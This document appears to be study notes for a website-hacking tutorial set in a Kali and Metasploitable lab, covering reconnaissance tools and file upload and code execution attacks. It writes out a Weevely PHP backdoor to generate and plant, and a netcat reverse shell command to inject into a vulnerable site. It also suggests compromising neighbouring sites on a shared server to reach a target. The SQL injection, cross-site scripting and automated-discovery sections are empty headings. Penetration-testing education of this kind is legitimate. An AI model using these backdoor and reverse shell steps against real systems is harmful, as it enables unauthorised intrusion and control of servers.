# Website Hacking

1. [Information Gathering](#information-gathering)

2. [File Vulnerabilities](#file-vulnerabilities)

3. [SQL Injection Vulnerabilities](#sql-injection-vulnerabilities)

4. [Cross Site Scripting Vulnerabilities](#cross-site-scripting-vulnerabilities)

5. [Discovering Vulnerabilities Automatically](#discovering-vulnerabilities-automatically)

For this section, the Metasploitable machine can be used with Kali, as we'll be making use of the web files stored in the former and attack it on using the latter. We can visit the Metasploitable website by simply using the IP address of the machine.

## Information Gathering

---

* [Whois Lookup](https://whois.domaintools.com/) can be used to find info about owner of target.

* [Netcraft](https://sitereport.netcraft.com/) shows the technologies used on the target.

* [Robtex](https://www.robtex.com/) shows comprehensive info about target.

* If we cannot hack our target website, we can hack other websites on the same server, to gain target access. To find websites on the same server, use Robtex DNS lookup (names pointing to same IP address).

* Knock can be used to find subdomains of target website:

```shell
knockpy google.com #shows subdomains of google.com
```

* Dirb can be used to find files & directories in target website:

```shell
man dirb #info about dirb

dirb http://10.0.2.5/mutillidae #uses default wordlist file to check directories

#this will give a list of discovered files for more info
```

## File Vulnerabilities

---

* File upload vulnerabilities allow users to upload executable files.

* Weevely can be used to generate PHP shells (backdoors) and gain access:

```shell
weevely generate 1234 /root/shell.php #generates a php shell with the password '1234'

#now the shell can be uploaded in the target website
#weevely can be used to interact with the uploaded file
#we have to give url of uploaded file and password

weevely http://10.0.2.5/dvwa/hackable/uploads/shell.php 1234 #this will give access to target file system
```

* Code execution vulnerabilities allow us to execute OS code on target server.

* Netcat can be used for this as it listens and connects computers:

```shell
nc -vv -l -p 8080 #using netcat to listen on port 8080

#now, we can try to connect from target server to our computer using the code execution vulnerability
nc -e /bin/sh 10.0.2.7 8080 #this command to be entered in the website
```

## SQL Injection Vulnerabilities

---

## Cross Site Scripting Vulnerabilities

---

## Discovering Vulnerabilities Automatically

---
